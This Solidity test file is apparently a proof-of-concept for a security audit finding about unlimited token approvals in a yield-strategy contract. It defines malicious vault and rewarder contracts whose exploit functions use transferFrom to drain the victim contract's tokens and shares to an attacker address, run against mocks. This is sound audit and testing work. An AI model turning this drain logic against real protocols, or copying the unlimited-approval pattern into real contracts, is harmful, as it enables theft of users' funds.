// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/concreteYieldStrategies/AutoPoolYieldStrategy.sol";
import "../../src/mocks/MockERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title UnlimitedApprovalRiskTest
 * @notice Proof-of-concept test demonstrating risk of unlimited token approvals
 * @dev Tests vulnerability M1 from security audit report
 *
 * VULNERABILITY: Constructor sets unlimited approvals to external contracts
 * - Line 107: underlyingToken.approve(_autoPoolVault, type(uint256).max)
 * - Line 110: IERC20(_autoPoolVault).approve(_mainRewarder, type(uint256).max)
 *
 * ATTACK SCENARIO:
 * 1. External contract (autoPool or MainRewarder) is compromised or has vulnerability
 * 2. Attacker calls transferFrom on behalf of AutoPoolYieldStrategy
 * 3. All approved tokens can be drained
 *
 * SEVERITY: MEDIUM
 * - Requires: Compromise of trusted external protocol
 * - Impact: Total fund loss
 * - Likelihood: Low (requires external protocol vulnerability)
 */
contract UnlimitedApprovalRiskTest is Test {
    AutoPoolYieldStrategy vault;
    MockERC20 underlyingToken;
    MockERC20 tokeToken;
    MaliciousVault maliciousVault;
    MaliciousRewarder maliciousRewarder;

    address owner = address(0x1234);
    address client = address(0x5678);
    address user1 = address(0xDEF0);
    address attacker = address(0x6666);

    uint256 constant INITIAL_SUPPLY = 10000000e18;

    function setUp() public {
        // Deploy real tokens
        underlyingToken = new MockERC20("Underlying", "UNDERLYING", 18);
        tokeToken = new MockERC20("TOKE", "TOKE", 18);

        // Deploy malicious contracts that will exploit unlimited approvals
        maliciousVault = new MaliciousVault(address(underlyingToken), attacker);
        maliciousRewarder = new MaliciousRewarder(attacker);

        // Deploy vault with malicious external contracts
        vm.prank(owner);
        vault = new AutoPoolYieldStrategy(
            owner, address(underlyingToken), address(tokeToken), address(maliciousVault), address(maliciousRewarder)
        );

        // Mint tokens
        underlyingToken.mint(client, INITIAL_SUPPLY);
        underlyingToken.mint(address(maliciousVault), INITIAL_SUPPLY);
        tokeToken.mint(address(maliciousRewarder), INITIAL_SUPPLY);

        // Authorize client
        vm.prank(owner);
        vault.setClient(client, true);
    }

    /**
     * @notice Test that unlimited underlying token approval can be exploited by malicious vault
     * @dev Demonstrates that if underlying tokens are sitting in the vault (e.g., from direct transfer
     *      or partial operation), a malicious autoPoolVault can drain it using unlimited approval
     */
    function testMaliciousVaultCanDrainUnderlying() public {
        // Setup: Register the vault with the malicious vault for exploitation
        maliciousVault.setApprovedVault(address(vault));

        // Simulate underlying tokens being in the vault (e.g., from direct transfer, airdrop, or stuck funds)
        // In real scenario, this could happen if someone sends tokens directly to the vault by mistake
        uint256 stuckTokenAmount = 10000e18;
        underlyingToken.mint(address(vault), stuckTokenAmount);

        // Verify vault holds underlying tokens
        uint256 vaultTokenBalance = underlyingToken.balanceOf(address(vault));
        assertEq(vaultTokenBalance, stuckTokenAmount, "Vault should hold underlying tokens");

        // EXPLOIT: Malicious vault uses unlimited approval to drain underlying tokens
        vm.prank(attacker);
        maliciousVault.exploitApproval();

        // VULNERABILITY: Attacker has drained all underlying tokens from vault
        uint256 vaultBalanceAfter = underlyingToken.balanceOf(address(vault));
        uint256 attackerBalance = underlyingToken.balanceOf(attacker);

        assertEq(vaultBalanceAfter, 0, "VULNERABILITY: Vault drained");
        assertEq(attackerBalance, stuckTokenAmount, "VULNERABILITY: Attacker stole underlying tokens");
    }

    /**
     * @notice Test that unlimited autoPool share approval can be exploited by malicious rewarder
     */
    function testMaliciousRewarderCanDrainShares() public {
        // Setup: User deposits underlying tokens, receives autoPool shares
        uint256 depositAmount = 10000e18;
        vm.prank(client);
        underlyingToken.approve(address(vault), depositAmount);
        vm.prank(client);
        vault.deposit(address(underlyingToken), depositAmount, user1);

        // Vault now has autoPool shares (represented by malicious vault tokens)
        uint256 vaultShareBalance = maliciousVault.balanceOf(address(vault));
        assertGt(vaultShareBalance, 0, "Vault should hold autoPool shares");

        // EXPLOIT: Malicious rewarder uses unlimited approval to drain shares
        vm.prank(attacker);
        maliciousRewarder.exploitShareApproval(address(maliciousVault), address(vault));

        // VULNERABILITY: Attacker has drained all shares from vault
        uint256 vaultBalanceAfter = maliciousVault.balanceOf(address(vault));
        uint256 attackerBalance = maliciousVault.balanceOf(attacker);

        assertEq(vaultBalanceAfter, 0, "VULNERABILITY: Shares drained");
        assertEq(attackerBalance, vaultShareBalance, "VULNERABILITY: Attacker stole shares");
    }

    /**
     * @notice Test that approval amounts are indeed unlimited
     */
    function testApprovalsAreUnlimited() public {
        // Check underlying token approval to vault
        uint256 underlyingApproval = underlyingToken.allowance(address(vault), address(maliciousVault));
        assertEq(underlyingApproval, type(uint256).max, "Underlying token approval is unlimited");

        // Check autoPool (vault token) approval to rewarder
        uint256 shareApproval = maliciousVault.allowance(address(vault), address(maliciousRewarder));
        assertEq(shareApproval, type(uint256).max, "Share approval is unlimited");
    }

    /**
     * @notice Test realistic exploit scenario with significant funds
     * @dev Shows that if large amounts of underlying tokens accumulate in the vault,
     *      the malicious vault can drain them all at once
     */
    function testLargeFundExploit() public {
        // Setup: Register the vault with the malicious vault for exploitation
        maliciousVault.setApprovedVault(address(vault));

        // Simulate large amounts of underlying tokens stuck in the vault
        // This could happen through multiple scenarios:
        // - Direct transfers by mistake
        // - Partial withdrawal failures
        // - Protocol accumulating fees
        uint256 totalAtRisk = 5000000e18;
        underlyingToken.mint(address(vault), totalAtRisk);

        // Verify total value at risk
        uint256 vaultBalance = underlyingToken.balanceOf(address(vault));
        assertEq(vaultBalance, totalAtRisk, "Vault should hold the at-risk underlying tokens");

        // Attacker exploits the unlimited approval
        vm.prank(attacker);
        maliciousVault.exploitApproval();

        // All funds stolen
        uint256 stolenAmount = underlyingToken.balanceOf(attacker);
        uint256 vaultBalanceAfter = underlyingToken.balanceOf(address(vault));

        assertEq(stolenAmount, totalAtRisk, "VULNERABILITY: Attacker stole all underlying tokens");
        assertEq(vaultBalanceAfter, 0, "VULNERABILITY: Vault completely drained");
    }
}

/**
 * @notice Malicious vault that exploits unlimited underlying token approval
 */
contract MaliciousVault is MockERC20 {
    address public underlying;
    address public immutable attacker;
    address public rewarderAddress;

    constructor(address _underlying, address _attacker) MockERC20("Malicious autoPool", "mautoPool", 18) {
        underlying = _underlying;
        attacker = _attacker;
    }

    function asset() external view returns (address) {
        return underlying;
    }

    function rewarder() external view returns (address) {
        return rewarderAddress;
    }

    // ERC4626 functions (minimal implementation for test)
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        // Transfer underlying from caller to this contract
        IERC20(underlying).transferFrom(msg.sender, address(this), assets);

        // Mint shares 1:1
        shares = assets;
        _mint(receiver, shares);

        return shares;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        // Burn shares
        _burn(owner, shares);

        // Transfer underlying to receiver
        assets = shares;
        IERC20(underlying).transfer(receiver, assets);

        return assets;
    }

    function convertToShares(uint256 assets) external pure returns (uint256) {
        return assets; // 1:1 for simplicity
    }

    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares; // 1:1 for simplicity
    }

    // Track the vault address that approved us
    address public approvedVault;

    function setApprovedVault(address vault) external {
        approvedVault = vault;
    }

    /**
     * @notice EXPLOIT: Use unlimited approval to drain underlying tokens from vault
     */
    function exploitApproval() external {
        require(msg.sender == attacker, "Only attacker");
        require(approvedVault != address(0), "No vault set");

        // Malicious vault has unlimited approval for the AutoPoolYieldStrategy's underlying tokens
        uint256 victimBalance = IERC20(underlying).balanceOf(approvedVault);

        // Steal all underlying tokens using the unlimited approval
        if (victimBalance > 0) {
            IERC20(underlying).transferFrom(approvedVault, attacker, victimBalance);
        }
    }
}

/**
 * @notice Malicious rewarder that exploits unlimited autoPool share approval
 */
contract MaliciousRewarder {
    address public immutable attacker;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function stake(address account, uint256 amount) external {
        // Normal staking - just track balance (simplified)
    }

    function withdraw(address account, uint256 amount, bool claim) external {
        // Normal unstaking - just update balance (simplified)
    }

    function earned(address account) external pure returns (uint256) {
        return 0;
    }

    function getReward(address account, address recipient, bool claimExtras) external pure returns (bool) {
        return true;
    }

    function balanceOf(address account) external pure returns (uint256) {
        return 0;
    }

    function totalSupply() external pure returns (uint256) {
        return 0;
    }

    function rewardToken() external pure returns (address) {
        return address(0);
    }

    /**
     * @notice EXPLOIT: Use unlimited approval to drain autoPool shares from vault
     */
    function exploitShareApproval(address shareToken, address victim) external {
        require(msg.sender == attacker, "Only attacker");

        // Malicious rewarder has unlimited approval for victim's autoPool shares
        uint256 victimBalance = IERC20(shareToken).balanceOf(victim);

        // Steal all shares
        IERC20(shareToken).transferFrom(victim, attacker, victimBalance);
    }
}
